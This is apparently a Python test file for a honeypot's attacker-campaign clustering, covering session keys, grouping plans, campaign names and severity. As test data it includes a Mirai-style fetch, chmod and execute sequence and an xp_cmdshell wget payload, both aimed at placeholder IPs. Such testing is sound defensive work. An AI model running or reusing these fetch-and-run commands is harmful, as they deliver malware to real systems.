"""Campaign clustering without a database: keys, the assignment plan, names and severity."""

from __future__ import annotations

from datetime import UTC, datetime, timedelta

from ingest.campaigns.keys import (
    credlist_key,
    exploit_key,
    is_benign_host,
    script_key,
)
from ingest.campaigns.naming import campaign_name, severity_of, stages_of
from ingest.campaigns.plan import Cand, build_plan

T0 = datetime(2026, 10, 24, 10, 0, tzinfo=UTC)


def cand(sid: str, ip: str, *keys: tuple[str, str], minutes: int = 0) -> Cand:
    return Cand(
        session_id=sid,
        sensor="telnet",
        src_ip=ip,
        started_at=T0 + timedelta(minutes=minutes),
        last_event_at=T0 + timedelta(minutes=minutes, seconds=30),
        keys=set(keys),
    )


# ---- keys ------------------------------------------------------------------------------------


def test_script_key_needs_two_commands_and_ignores_addresses() -> None:
    a = script_key(["cd /tmp", "wget http://192.0.2.1/x86", "chmod 777 x86", "./x86"])
    b = script_key(["cd /var", "wget http://203.0.113.9:81/x86", "chmod 755 x86", "./x86"])
    assert a is not None
    assert a == b
    assert script_key(["uname -a"]) is None
    assert script_key(["cd /tmp", "pwd", "uname -a"]) is None


def test_exploit_key_ignores_volatile_parts_but_not_the_shape() -> None:
    a = exploit_key("http_request", "post", "/up.php?id=12&x=1", "a=1&b=2")
    b = exploit_key("http_request", "POST", "/up.php?id=99&x=7", "a=9&b=8")
    c = exploit_key("http_request", "POST", "/up.php?id=99&x=7", "c=1")
    assert a == b
    assert a != c
    sql_a = exploit_key("command", "", "", "EXEC xp_cmdshell 'wget http://192.0.2.5/a'")
    sql_b = exploit_key("command", "", "", "exec xp_cmdshell 'wget http://203.0.113.9/a'")
    assert sql_a == sql_b


def test_credlist_key_is_order_independent_and_needs_a_list() -> None:
    pairs = [(f"user{i}", f"pw{i}") for i in range(40)]
    assert credlist_key(pairs) == credlist_key(list(reversed(pairs)))
    assert credlist_key(pairs[:5]) is None
    assert credlist_key(pairs[:25]) is not None


def test_benign_hosts() -> None:
    assert is_benign_host("raw.githubusercontent.com")
    assert is_benign_host("GitHub.com.")
    assert not is_benign_host("evilgithub.com")
    assert not is_benign_host("dl.example.net")


# ---- plan ------------------------------------------------------------------------------------

K1 = ("script", "aa")
K2 = ("payload_host", "dl.example.net")
K3 = ("family", "mirai")


def test_a_key_from_two_sources_founds_a_campaign() -> None:
    plan = build_plan([cand("a", "192.0.2.1", K1), cand("b", "192.0.2.2", K1)], {}, {}, 2)
    assert plan.groups == [["a", "b"]]
    assert plan.joins == {}


def test_one_source_does_not_found_a_campaign() -> None:
    plan = build_plan([cand("a", "192.0.2.1", K1), cand("b", "192.0.2.1", K1)], {}, {}, 2)
    assert plan.groups == []


def test_credlist_needs_three_sources() -> None:
    key = ("credlist", "cc")
    two = build_plan([cand("a", "192.0.2.1", key), cand("b", "192.0.2.2", key)], {}, {}, 2)
    three = build_plan([cand(s, f"192.0.2.{i}", key) for i, s in enumerate("abc", 1)], {}, {}, 2)
    assert two.groups == []
    assert three.groups == [["a", "b", "c"]]


def test_a_mapped_key_makes_the_session_join_even_from_one_source() -> None:
    plan = build_plan([cand("a", "192.0.2.1", K1)], {K1: 7}, {7: (T0, 7)}, 2)
    assert plan.joins == {"a": 7}
    assert plan.groups == []


def test_keys_of_two_campaigns_merge_into_the_oldest() -> None:
    order = {3: (T0, 3), 9: (T0 - timedelta(days=1), 9)}
    plan = build_plan([cand("a", "192.0.2.1", K1, K2)], {K1: 3, K2: 9}, order, 2)
    assert plan.merges == [(3, 9)]
    assert plan.joins == {"a": 9}


def test_merge_budget_defers_the_session() -> None:
    order = {3: (T0, 3), 9: (T0 - timedelta(days=1), 9)}
    plan = build_plan([cand("a", "192.0.2.1", K1, K2)], {K1: 3, K2: 9}, order, 2, merge_budget=0)
    assert plan.merges == []
    assert plan.joins == {}
    assert plan.deferred == 1


def test_sessions_linked_by_different_keys_share_one_campaign() -> None:
    sessions = [
        cand("a", "192.0.2.1", K1),
        cand("b", "192.0.2.2", K1, K2),
        cand("c", "192.0.2.3", K2),
        cand("z", "192.0.2.4", K3),
    ]
    plan = build_plan(sessions, {}, {}, 2)
    assert plan.groups == [["a", "b", "c"]]


def test_a_joined_session_pulls_in_earlier_sessions_with_its_other_keys() -> None:
    sessions = [cand("a", "192.0.2.1", K2, minutes=0), cand("b", "192.0.2.2", K1, K2, minutes=5)]
    plan = build_plan(sessions, {K1: 4}, {4: (T0, 4)}, 2)
    assert plan.joins == {"a": 4, "b": 4}


# ---- naming ----------------------------------------------------------------------------------


def test_names_follow_family_then_objective_then_sensor() -> None:
    assert campaign_name(["mirai"], ["mirai"], ["telnet"], 41) == "Mirai loader over Telnet #41"
    assert (
        campaign_name([], ["crypto-miner", "recon"], ["ssh"], 7) == "Crypto-miner drop over SSH #7"
    )
    assert campaign_name([], [], ["web"], None) == "Shared activity over HTTP"
    assert campaign_name(["Evil<script>"], [], [], 1) == "Evilscript campaign #1"


def test_severity_and_stages() -> None:
    assert severity_of(["php2shell"]) == "severe"
    assert severity_of(["db-ransom"]) == "warning"
    assert severity_of([], commands=2) == "warning"
    assert severity_of([], login_attempts=3) == "notice"
    assert severity_of([]) == "info"
    stages = {"T1105": "tool_transfer", "T1082": "recon", "T1496": "objective"}
    assert stages_of(["T1496", "T1082", "T1105", "T0000"], stages) == [
        "recon",
        "tool_transfer",
        "objective",
    ]
